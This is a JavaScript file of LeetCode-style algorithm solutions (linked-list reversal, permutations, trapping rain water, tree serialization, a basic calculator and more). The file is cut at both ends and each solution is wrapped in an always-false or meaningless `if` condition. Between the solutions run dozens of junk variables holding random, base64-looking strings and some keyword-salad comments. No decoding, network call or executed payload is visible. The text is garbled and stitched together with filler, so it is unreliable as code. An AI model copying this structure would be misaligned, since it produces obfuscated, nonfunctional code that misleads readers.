Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.

If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.

You may not alter the values in the nodes, only nodes itself may be changed.

Only constant memory is allowed.

For example,
Given this linked list: 1->2->3->4->5

For k = 2, you should return: 2->1->4->3->5

For k = 3, you should return: 3->2->1->4->5
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
 
// iterative solution, not recommended, very easy to make mistakes
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var dummy = new ListNode(0),
        i = 0,
        node = head,
        next,
        prevTail,
        curHead,
        curTail,
        nextHead,
        nextTail;
    
    while (node) {
        node = node.next;
        i++;
        
        if (i >= k) {
            break;
        }
    }
    
    if (k === 1 || i < k ) {
        return head;
    }
    
    i = 0;
    
    dummy.next = head;
    prevTail = dummy;
    node = head;
    
    while (node) {
        if (i === 0) {
            curTail = node;
            next = node.next;
            node.next = null;
            prevTail.next = node;
        } else {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
        }
        
        i++;
        
        if (i === k) {
            prevTail = curTail;
            i = 0;
        }
        
        node = next;
    }
    
    if (i < k) {
        node = prevTail.next;
        prevTail.next = null;
        
        while (node) {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
            node = next;
        }
    }
    
    return dummy.next;
};

// recursive
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var i = 0,
        newHead = head,
        dummy = new ListNode(0),
        prev,
        cur,
        next;
    
    for (i = 0; i < k; i++) {
        if (newHead === null) {
            return head;
        }
        
        newHead = newHead.next;
    }
    
    newHead = reverseKGroup(newHead, k);
    cur = head;
    dummy.next = newHead;
    
    for (i = 0; i < k; i++) {
        next = cur.next;
        cur.next = dummy.next;
        dummy.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var naelesmaeu = 'orgmy';
    var qituabr = 'RHaHl';
if (2 > 138) {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var ytnbia = 'sdyUQaChb';
    var tibajyrphhyx = 'aWE5vY';
if (!true && 1) {
    /**
Related to question Excel Sheet Column Title

Given a column title as appear in an Excel sheet, return its corresponding column number.

For example:

    A -> 1
    B -> 2
    C -> 3
    ...
    Z -> 26
    AA -> 27
    AB -> 28 

 * @param {string} s
 * @return {number} Return column number
 */
var titleToNumber = function(s) {
    var len = s.length,
        i,
        result = 0;
    for (i = 0; i < len; i++) {
        result += Math.pow(26, len - i - 1) * (s.charAt(i).charCodeAt() - 'A'.charCodeAt() + 1);
    }
    return result;
};

}

    var owpcit = 'YHmJXWMfxn';
    var pjpifnn = 'jJ4';
    var fchzqkfce = 'LQsRWKps';
    var rvxaam = 'a0lHb';
    var sjmfih = 'UzraV';
// hello hello export script script debug string compile loop code constant debug function compile
    var kqozephyppzg = 'PaYYY';
if (0.66 && false) {
    /**
Given a set of distinct integers, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,3], a solution is:

[
  [3],
  [1],
  [2],
  [1,2,3],
  [1,3],
  [2,3],
  [1,2],
  []
]
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsets = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var srnfg = 'HVJ';
if (71 > 108) {
    /**
Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.

For example, 
Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6.


The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!


*/

// add new solution 
/**
 * @param {number[]} height
 * @return {number}
 *
 * Search from left to right and maintain a max height of left and right separately, which is like a one-side wall of partial container. Fix the higher one and flow water from the lower part. For example, if current height of left is lower, we fill water in the left bin. Until left meets right, we filled the whole container.
 */
var trap = function(height) {
    var len = height.length,
        leftMax = 0,
        rightMax = 0,
        left = 0,
        right = len - 1,
        sum = 0;
    
    while (left <= right) {
        if (height[left] <= height[right]) {
            if (height[left] > leftMax) {
                leftMax = height[left];
            } else {
                sum += leftMax - height[left];
            }
            
            left++;
        } else {
            if (height[right] > rightMax) {
                rightMax = height[right];
            } else {
                sum += rightMax - height[right];
            }
            
            right--;
        }
    }
    
    return sum;
};


/**
 * @param {number[]} height
 * @return {number}
 */
var trap = function(height) {
    var len = height.length,
        leftMax = [],
        rightMax = [],
        max,
        sum = 0,
        i;
    
    leftMax[0] = 0;
    rightMax[len - 1] = 0;
    
    for (i = 1; i < len; i++) {
        leftMax[i] = Math.max(leftMax[i - 1], height[i - 1]);
    }
    
    for (i = len - 2; i >= 0; i--) {
        rightMax[i] = Math.max(rightMax[i + 1], height[i + 1]);
    }
    
    for (i = 1; i < len - 1; i++) {
        max = Math.min(leftMax[i], rightMax[i]);
        
        if (max - height[i] > 0) {
            sum += max - height[i];
        }
    }
    
    return sum;
};

}

    var jrfmphnd = 'FrYkwNsPl';
    var vzzzydogb = 'RzFwYkd4cG';
if (0.59 && false) {
    /**
Given a 2D binary matrix filled with 0's and 1's, find the largest rectangle containing all ones and return its area.
*/
/**
 * @param {character[][]} matrix
 * @return {number}
 */
var maximalRectangle = function(matrix) {
    var rLen = matrix.length,
        cLen,
        dp = [],
        max = 0,
        stack,
        temp,
        curRow,
        i,
        j;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    if (cLen === 1 && rLen === 1) {
        return matrix[0][0] === "1" ? 1 : 0;
    }
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
        
        for (j = 0; j < cLen; j++) {
            if (matrix[i][j] === '0') {
                dp[i][j] = 0;
            } else {
                if (i === 0) {
                    dp[i][j] = 1;
                } else {
                    dp[i][j] = dp[i - 1][j] + 1;
                }
                
            }
        }
    }
    
    for (i = 0; i < rLen; i++) {
        stack = [];
        
        curRow = dp[i].concat();
        curRow.push(0);
        for (j = 0; j < cLen + 1;) {
            if (stack.length > 0 && curRow[j] <= curRow[stack[stack.length - 1]]) {
                temp = stack.pop();
                max = Math.max(max, dp[i][temp] * (stack.length === 0 ? j : j - stack[stack.length - 1] - 1));
            } else {
                stack.push(j);
                j++;
            }
        }
    }
    
    return max;
};

}

    var ktnqnxvmmjdg = 'ijVa';
if ('true' === true) {
    /**
Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.

Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.

For example, you may serialize the following tree

    1
   / \
  2   3
     / \
    4   5
as "[1,2,3,null,null,4,5]", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.
Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * Encodes a tree to a single string.
 *
 * @param {TreeNode} root
 * @return {string}
 */
var serialize = function(root) {
    var result = [];
    
    sHelper(root, result);
    return result.toString();
};

function sHelper(root, result) {
    if (root === null) {
        result.push('#');
        return;
    }
    
    result.push(root.val);
    sHelper(root.left, result);
    sHelper(root.right, result);
}
/**
 * Decodes your encoded data to tree.
 *
 * @param {string} data
 * @return {TreeNode}
 */
var deserialize = function(data) {
    var arr = data.split(','),
        len = arr.length;
        
    if (len === 0) {
        return null;
    }
    
    return buildTree(arr);
};

function buildTree(arr) {
    var curNode,
        val;
    
    if (arr.length === 0) {
        return null;
    }
    
    val = arr.shift();
    
    if (val === '#') {
        return null;
    }
    
    curNode = new TreeNode(parseInt(val));
    curNode.left = buildTree(arr);
    curNode.right = buildTree(arr);
    
    return curNode;
}

/**
 * Your functions will be called as such:
 * deserialize(serialize(root));
 */

}

    var evucc = 'MyVmpiM';
if (typeof document === 'undefined') {
    /**
Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number.

An example is the root-to-leaf path 1->2->3 which represents the number 123.

Find the total sum of all root-to-leaf numbers.

For example,

    1
   / \
  2   3
The root-to-leaf path 1->2 represents the number 12.
The root-to-leaf path 1->3 represents the number 13.

Return the sum = 12 + 13 = 25.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var sumNumbers = function(root) {
    var arr = [0];
    
    helper(root, 0, arr);
    
    return arr[0];
};

function helper(node, sum, arr) {
    if (!node) {
        return;
    }
    
    sum = sum*10 + node.val;
    
    if (!node.left && !node.right) {
        arr[0] += sum;
        return;
    }
    
    if (node.left) {
        helper(node.left, sum, arr);
    }
    
    if (node.right) {
        helper(node.right, sum, arr);
    }
    
}

}

    var peweukkouk = 'UluLlRQ';
    var mrsgvtlnzhos = 'jVrY';
    var rfdixdqftxyq = 'vLXAyDgkFa';
    var rdeowh = '3dvZ';
if (typeof window === 'undefined') {
    /**
Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.

For example,
Given the following matrix:

[
 [ 1, 2, 3 ],
 [ 4, 5, 6 ],
 [ 7, 8, 9 ]
]
You should return [1,2,3,6,9,8,7,4,5].
*/

/**
 * @param {number[][]} matrix
 * @return {number[]}
 */
var spiralOrder = function(matrix) {
    var rowL = matrix.length,
        result = [],
        columnL;
        
    if (rowL === 0) {
        return result;
    }
    
    columnL = matrix[0].length;
    
    helper(0, rowL, columnL, matrix, result);
    return result;
};

function helper(level, row, column, matrix, result) {
    var i;
    
    if (row === 0 || column === 0) {
        return;
    } else if (row === 1) {
        for (i = 0; i < column; i++) {
            result.push(matrix[level][i + level]);
        }
    } else if (column === 1) {
        for (i = 0; i < row; i++) {
            result.push(matrix[i + level][level]);
        }
    } else {
        // top
        for (i = 0; i < column - 1; i++) {
            result.push(matrix[level][i + level]);
        }
        
        // right
        for (i = 0; i < row - 1; i++) {
            result.push(matrix[i + level][column + level - 1]);
        }
        
        // bottom
        for (i = column - 1; i > 0; i--) {
            result.push(matrix[row + level - 1][i + level]);
        }
        
        // left
        for (i = row - 1; i > 0; i--) {
            result.push(matrix[i + level][level]);
        }
        
        helper(level + 1, row - 2, column - 2, matrix, result);
    }
}

}

    var gerjdggozzc = 'TTeUf';
    var vuhcxceqcd = '0lDQWdjM';
if (typeof document === 'undefined') {
    /**
Implement a basic calculator to evaluate a simple expression string.

The expression string contains only non-negative integers, +, -, *, / operators and empty spaces . The integer division should truncate toward zero.

You may assume that the given expression is always valid.

Some examples:
"3+2*2" = 7
" 3/2 " = 1
" 3+5 / 2 " = 5
Note: Do not use the eval built-in library function.
*/
/**
 * @param {string} s
 * @return {number}
 */
var calculate = function(s) {
    var signs = [],
        nums = [],
        len = s.length,
        num = 0,
        ch,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (!isNaN(parseInt(ch))) {
            num = 0;
            for (j = i; j < len && !isNaN(parseInt(s.charAt(j))); j++) {
                num = num * 10 + parseInt(s.charAt(j));
            }
            
            i = j - 1;
            nums.push(num);
        } else if (ch === '-' || ch === '+' || ch === '*' || ch === '/') {
            signs.push(ch);
        }
    }
    
    for (i = 0; i < signs.length;) {
        if (signs[i] === '*') {
            num = nums[i] * nums[i + 1];
            nums.splice(i, 2, num);
            signs.splice(i, 1);
        } else if (signs[i] === '/') {
            num = Math.floor(nums[i] / nums[i + 1]);
            nums.splice(i, 2, num);
            signs.splice(i, 1);
        } else {
            i++;
        }
    }
    
    num = nums.shift();
    for (i = 0; i < signs.length; i++) {
        if (signs[i] === '+') {
            num += nums.shift();
        } else if (signs[i] === '-') {
            num -= nums.shift();
        }
    }
    
    return num;
};


}

    var acjvqjnewukt = 'awfJ';
    var pscedfdafje = 'lYwU';
    var oaqhzsih = 'MccVEINGb';
    var mrojpvxvtyu = '1c1MFpYSjJ';
    var yblfhjgevgp = 'CQfI';
    var jvgcxnxbonjnxa = 'ZV3';
    var pelbaw = 'vaqMQ';
    var dqwymibeiiz = 'dvWm';
    var mgwbir = 'OECbQOFSyk';
    var yzkyzugah = '5WdVkzUn';
    var dtrzyt = 'SuUSmA';
    var txxqxwlmpjv = 'BiMjR';
if (2 === 19) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var ivwtpfri = 'hZVOB';
if (0.91 && false) {
    /**
Given a linked list, determine if it has a cycle in it.

Follow up:
Can you solve it without using extra space?

 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {boolean}
 */
var hasCycle = function(head) {
    var slow = head,
        fast = head;
    
    while(fast !== null && fast.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow === fast || (fast && fast.next === slow)) {
            return true;
        }
    }
    return false;
};

}

    var wewqzfteswerm = 'vS1NCN0N';
    var yebxabofndsa = 'ZhRtHiVCXm';
if (0.13 && false) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var nngvpk = 'pQWd';
    var akvlqfywkst = 'aHwceG';
    var dttponcygclairb = 'JQ0FnSU';
if (Array.isArray(6)) {
    /**
Given an array of integers, every element appears three times except for one. Find that single one.

Note:
Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var singleNumber = function(nums) {
    var arr = [],
        len = nums.length,
        num,
        cur,
        result = 0,
        i,
        j;
    
    for (i = 0; i < 32; i++) {
        arr[i] = 0;
    }
    
    for (i = 0; i < len; i++) {
        num = nums[i];
        
        cur = num;
        for (j = 0; j < 32; j++) {
            if (cur === 0) {
                break;
            }
            
            arr[j] += (cur & 1);
            
            cur = (cur >> 1);
        }
    }
    
    for (i = 0; i < 32; i++) {
        result += ((arr[i] % 3) << i);
    }
    
    return result;
};

}

    var nvjexqzlnnn = 'PMnEyaEt';
if (!true && 1) {
    /**
Given a complete binary tree, count the number of nodes.

Definition of a complete binary tree from Wikipedia:
In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and 2h nodes inclusive at the last level h.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var countNodes = function(root) {
    if (root === null) {
        return 0;
    }
    
    var tmp = root,
        totalDep = 0,
        nodeNumsInLastLevel = 0,
        node = root,
        curDep,
        depSplit;
    
    while (tmp) {
        tmp = tmp.left;
        totalDep++;
    }
    
    curDep = 1;
    while (curDep < totalDep) {
        depSplit = findSplit(node);
        
        if (depSplit + curDep === totalDep) {
            nodeNumsInLastLevel += Math.pow(2, depSplit - 1);
            node = node.right;
        } else {
            node = node.left;
        }
        
        curDep++;
    }
    
    return Math.pow(2, totalDep - 1) + nodeNumsInLastLevel;
};

// find the depth of left most node in right subtree of current node
// binary search in last level
function findSplit(root) {
    if (!root || !root.right) {
        return 0;
    }
    
    var dep = 0,
        tmp = root;
    
    tmp = tmp.right;
    while(tmp) {
        dep++;
        tmp = tmp.left;
    }
    
    return dep;
}

}

    var cevrhtib = 'NBZ1k';
    var dqepive = 'KPyNjrXtwR';
    var adhmhczpdr = 'yOXVjM1';
    var ozgnhmhftwag = 'dLHklpsLI';
// value debug sgwbc constant async string
if ('true' === true) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var jxfdoa = 'MURteSsYbC';
if ('o' === 'S') {
    /**
Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required.

Example 1:
nums = [1, 3], n = 6
Return 1.

Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.
Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].
Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].
So we only need 1 patch.

Example 2:
nums = [1, 5, 10], n = 20
Return 2.
The two patches can be [2, 4].

Example 3:
nums = [1, 2, 2], n = 5
Return 0.
*/
/**
 * @param {number[]} nums
 * @param {number} n
 * @return {number}
 * nums[i] <= known_sum，更新已知范围为：[1,known_sum + nums[i] )
   nums[i] >  known_sum,  添加known_sum进数组才能达到最大的范围，所以已知范围更新为：[1,known_sum *2  )
 */

//  time limit exceeded
var minPatches = function(nums, n) {
    var knownSum = 1,
        len = nums.length,
        count = 0,
        i = 0;
        
    while (knownSum <= n) {
        if (i < len && knownSum >= nums[i]) {
            knownSum += nums[i];
            i++;
        } else {
            knownSum <<= 1;
            count++;
        }
    }
    
    return count;
};

}

    var yuepxsgxuwfzote = 'FnYzNSaGNu';
if (5 === 18) {
    // Submission Result: Memory Limit Exceeded More Details 

// Last executed input:
// 123456

/**
 * @param {number} num
 * @return {number[]}
 */
 
/**
当一个数为2的整数幂的时候，1的个数为1，比如2（10) 和4(100)，8(1000)

在这之后就是前一个序列的数+1 比如 9(1001) = 1(1) + 8 (1) = 2

就是把一个数分解为小于它的最大2的整数幂 + x
*/
var countBits = function(num) {
    var result = [],
        pow = 1,
        copyOfPow = 1,
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
        if (i === pow) {
            result[i] = 1;
            copyOfPow = pow;
            pow *= 2;
        } else {
            result[i] = result[copyOfPow] + result[i - copyOfPow];
        }
    }
    
    return result;
};

/**
倒过来想，一个数 * 2 就是把它的二进制全部左移一位，也就是说 1的个数是相等的。

那么我们可以利用这个结论来做。

res[i /2] 然后看看最低位是否为1即可（上面*2一定是偶数，这边比如15和14除以2都是7，但是15时通过7左移一位并且+1得到，14则是直接左移）

所以res[i] = res[i >>1] + (i&1)
*/
var countBits = function(num) {
    var result = [],
        i;
        
    result[0] = 0;
    
    for (i = 1; i <= num; i++) {
       result[i] = result[i>>1] + (i & 1);
    }
    
    return result;
};

}

    var ttynklsfk = 'JFnejcJSn';
if ('e' === 'L') {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var npuzgyepez = 'UWdQU';
    var ybptauik = 'jLSI';
    var drzssi = '0J3Wlh';
    var bultuc = 'RsvtQQyXyV';
    var mvzpw = 'KbW';
    var eliubgay = 'pffkCtE';
// ddfzaqr export script code event number import number vypnbmg zbqf refkoful jzog event
    var pukkmvujl = 'kcXCBys';
    var hhrap = 'IzSnR';
    var exgyaqs = 'jroQXtZSU';
if (null === 1) {
    /**
Write a program to check whether a given number is an ugly number.

Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 6, 8 are ugly while 14 is not ugly since it includes another prime factor 7.

Note that 1 is typically treated as an ugly number.
*/

/**
 * @param {number} num
 * @return {boolean}
 */
var isUgly = function(num) {
    if (num <= 0) {
        return false;
    }
    
    while (num % 2 === 0) {
        num = num / 2;
    }
    
    while (num % 3 === 0) {
        num = num / 3;
    }
    
    while (num % 5 === 0) {
        num = num / 5;
    }
    
    return num === 1;
};

}

    var qwslbtggrsp = 'ZVzVqW';
if (1 === 17) {
    /**
Given a non-empty array of integers, return the k most frequent elements.

For example,
Given [1,1,1,2,2,3] and k = 2, return [1,2].

Note: 
You may assume k is always valid, 1 ≤ k ≤ number of unique elements.
Your algorithm's time complexity must be better than O(n log n), where n is the array's size.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {number[]}
 * 
 *  Build a array of list to be buckets with length 1 to sort.
 */
var topKFrequent = function(nums, k) {
    let len = nums.length;
    const bucket = {};
    const freqs = [];
    let result = [];
    
    nums.forEach((num) => {
        if (bucket[num] === undefined) {
            bucket[num] = 1;
        } else {
            bucket[num]++;
        }
    });
    
    Object.keys(bucket).forEach((num) => {
        const freq = bucket[num];
        num = parseInt(num);
        
        if (freqs[freq] === undefined) {
            freqs[freq] = [num];
        } else {
            freqs[freq].push(num);
        }
    });
    
    let j = 0;
    for (let i = freqs.length; i >= 0; i--) {
        if (freqs[i] !== undefined) {
            len = freqs[i].length;
            
            for (let m = 0; m < len; m++) {
                if (j === k) {
                    break;
                }
                
                result.push(freqs[i][m]);
                j++;
            }
            
            if (j === k) {
                break;
            }
        }
    }
    
    return result;
};

}

    var slgbuoacl = 'eVlbP';
    var simohiybowvpmss = 'lM1dWIzY2';
    var fkpfsouzmdd = 'KcrqifgFwg';
if (4 === 15) {
    /**
 * @param {number} n
 * @return {number}
 * 
 * 我们知道，每当灯泡会改变状态，也就是 toggle 时，是因为它出现在了某个数的整数倍上。

对于第1个灯泡：1*1，会改变1次状态，即 off -》on

对于第2个灯泡：1*2，2*1，会改变2次状态，即 off -》on -》off

对于第3个灯泡：1*3，3*1，会改变2次状态，即 off -》on -》off

对于第4个灯泡：1*4，2*2，4*1，会改变3次状态，即 off -》on -》off -》on

……

会发现，每当我找到一个数的整数倍，总会找到对称的一个整数倍，例如 1*2，就肯定会有一个 2*1。唯一的例外出现在平方数上，例如 4 = 2*2，只有一次整数倍。

每次作为偶数次整数倍，最终的灯泡都会还原为 off；只有作为奇数次整数倍，最终的灯泡都会 on。
也就是说，最终亮的灯泡数目由小于其的最大平方数确定。
 * 
 */
var bulbSwitch = function(n) {
    return Math.floor(Math.sqrt(n));
};

}

    var tscpypdrwaevpgw = '9LVHN';
    var yiqowo = 'qBlRhjDVP';
if (!true && 0) {
    /**
Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results.

Note: The input string may contain letters other than the parentheses ( and ).

Examples:
"()())()" -> ["()()()", "(())()"]
"(a)())()" -> ["(a)()()", "(a())()"]
")(" -> [""]

*/
/**
 * @param {string} s
 * @return {string[]}
 */
var removeInvalidParentheses = function(s) {
    var result = [];
    
    dfs(result, s, '', 0, 0);
    
    if (result.length === 0) {
        result.push('');
    }
    
    return result;
};

var max = 0; // max is to make sure we're removing the minimum number of parentheses

function dfs(result, str, curStr, leftCount, leftAccumulated) {
    if (str.length === 0) {
        if (curStr.length > 0 && leftCount === 0) {
            if (max < leftAccumulated) {
                max = leftAccumulated;
            }
            
            if (max === leftAccumulated && result.indexOf(curStr) === -1) {
                result.push(curStr);
            }
        }
        
        return;
    }
    
    var char = str.charAt(0);
    
    if (char === '(') {
        // keep (
        dfs(result, str.substr(1), curStr + '(', leftCount + 1, leftAccumulated + 1);
        // not keep (
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else if (char === ')') {
        if (leftCount > 0) {
            dfs(result, str.substr(1), curStr + ')', leftCount - 1, leftAccumulated);
        }
        
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else {
        dfs(result, str.substr(1), curStr + char, leftCount, leftAccumulated);
    }
}

}

    var fngrelvuvfgq = 'LSUNBZ';
    var meqgnx = 'fWFLHJIbTj';
if ('r' === 'B') {
    /**
There are N gas stations along a circular route, where the amount of gas at station i is gas[i].

You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from station i to its next station (i+1). You begin the journey with an empty tank at one of the gas stations.

Return the starting gas station's index if you can travel around the circuit once, otherwise return -1.

Note:
The solution is guaranteed to be unique.
*/
/**
 * @param {number[]} gas
 * @param {number[]} cost
 * @return {number}
 * 
在任何一个节点，其实我们只关心油的损耗，定义： 

diff[i] = gas[i] – cost[i]  0<=i <n 

那么这题包含两个问题： 

1. 能否在环上绕一圈？ 

2. 如果能，这个起点在哪里？ 

第一个问题，很简单，我对diff数组做个加和就好了，leftGas = ∑diff[i]， 如果最后leftGas是正值，那么肯定存在这么一个起始点。如果是负值，那说明，油的损耗大于油的供给，不可能有解。得到第一个问题的答案只需要O(n)。 

对于第二个问题，起点在哪里？ 

假设，我们从环上取一个区间[i, j], j>i， 然后对于这个区间的diff加和，定义 

sum[i,j] = ∑diff[k] where i<=k<j 

如果sum[i,j]小于0，那么这个起点肯定不会在[i,j]这个区间里，跟第一个问题的原理一样。举个例子，假设i是[0,n]的解，那么我们知道 任意sum[k,i-1] (0<=k<i-1) 肯定是小于0的，否则解就应该是k。同理，sum[i,n]一定是大于0的，否则，解就不应该是i，而是i和n之间的某个点。所以第二题的答案，其实就是在0到n之间，找到第一个连续子序列（这个子序列的结尾必然是n）大于0的。 

至此，两个问题都可以在一个循环中解决。
 */
var canCompleteCircuit = function(gas, cost) {
    var len = gas.length,
        diff = [],
        curSum = 0,
        sum = 0,
